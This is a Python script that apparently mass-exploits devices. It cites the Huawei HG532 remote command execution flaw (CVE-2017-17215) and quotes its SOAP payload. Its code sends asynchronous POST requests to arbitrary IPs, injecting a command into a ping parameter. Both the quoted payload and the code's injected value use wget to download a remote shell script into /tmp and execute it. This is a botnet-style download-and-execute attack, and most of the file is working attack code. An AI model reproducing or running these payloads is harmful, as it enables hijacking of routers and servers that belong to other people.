# Huawei Router HG532 - Arbitrary Command Execution
# https://www.exploit-db.com/exploits/43414
# CVE: 2017-17215

# POST /ctrlt/DeviceUpgrade_1
# <?xml version=”1.0″ ?><s:Envelope xmlns:s=”http://schemas.xmlsoap.org/soap/envelope/” s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/”><s:Body><u:Upgrade xmlns:u=”urn:schemas-upnp-org:service:WANPPPConnection:1″><NewStatusURL>$(/bin/busybox wget -g %s -l /tmp/huawei -r /huawei; sh /tmp/huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>

import aiohttp
import asyncio
import random
import re

async def check_response(content):
    print("Contents check.....")
    # print(content) ##### DEBUGGING LINE - VIEW CONTENT BEFORE CHECK #####
    return True ##### DEUGGING LINE - SKIP CONTENT CHECK #####
    content = str(content)
    title_search = re.search('<title>(.*)</title>', content, re.IGNORECASE)
    if title_search:
        title = title_search.group(1)
        if title == "Title TRUE":
            return True
        elif title == "404 Not Found":
            print("404 Not Found")
            return False
        else:
            print(f"Unknown title: {title}")
            return False
    else:
        print("FAIL! Can't find page title, unable to check content!")
        return False

async def exploit(ip, timeout):
    delay = random.uniform(0, 3)
    delay = 0 ##### DEUGGING LINE - RESET/SKIP DELAY TIMER #####
    await asyncio.sleep(delay)
    print(f'Started downloading {ip}')
    async with aiohttp.ClientSession() as session:
        try:
            payload = 'null'
            headers = {
            'Authoization':'',
            'Accept':'*/*',
            'Referer':'',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'en-US,en;q=0.5',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With':'XMLHttpRequest',
            'Cookie':'JSESSIONID=542B58462355E4E3B99FAA42842E62FF',
            'Connection':'close',
            'Pragma':'no-cache',
            'Cache-Control':'no-cache',
            'Content-Length':''
            }
            path = "post.php"
            suffix = "cmd+%2Fc+ping&argument=127.0.0.1+%7C+`wget%20http://host.here/exec.sh%20-O%20-%3E%20/tmp/nemp;sh%20/tmp/nemp`&async_output=ping1487856455258&isWindows=false"
            url = f"http://{ip}/{path}?{suffix}"

            async with session.post(url, data=payload, headers=headers, timeout=timeout) as resp:
                status = resp.status
                if status == 200:
                    print("200: OK")
                if status == 301:
                    print("301: Moved Permanently")
                if status == 302:
                    print("302: Moved Temporarily")
                if status == 304:
                    print("304: Not Modified")
                if status == 307:
                    print("307: Temporary Redirect")
                if status == 400:
                    print("400: Bad Request")
                if status == 401:
                    print("401: Unauthorized")
                if status == 403:
                    print("403: Forbidden")
                if status == 404:
                    print("404: Not Found")
                if status == 405:
                    print("405: Method Not Allowed")
                if status == 410:
                    print("410: Gone")
                if status == 500:
                    print("500: Internal Server Error")
                if status == 502:
                    print("502: Bad Gateway")
                if status == 503:
                    print("503: Service Unavailable")
                if status == 504:
                    print("504: Gateway Timeout")
                if status == 550:
                    print("550: Permission Denied")
                
                headers = resp.headers
                print(headers['Server'])
                for header in headers:
                    print(f"{header}: {headers[header]}\r\n")

                content = await resp.read()
                print(f'Finished downloading {url}\nUsing delay {delay}')
                if await check_response(content):
                    print("PASS! Content check good!")
                    return content
                else:
                    print("FAIL! Content check fail, restarting download...\n")
        except asyncio.TimeoutError as e:
            print(f"FAIL! Timed out!")
            print(f"Error: {e}\n")
            pass
        except aiohttp.client_exceptions.ClientConnectorError as e:
            print(f"FAIL! Couldn't connect")
            print(f"Error: {e}\n")
            pass
        except aiohttp.client_exceptions.ClientResponseError as e:
            print(f"FAIL! Client response error")
            print(f"Error: {e}\n")
        except Exception as e:
            print(f"Uh oh. Something fucked up: {e}\n")
            pass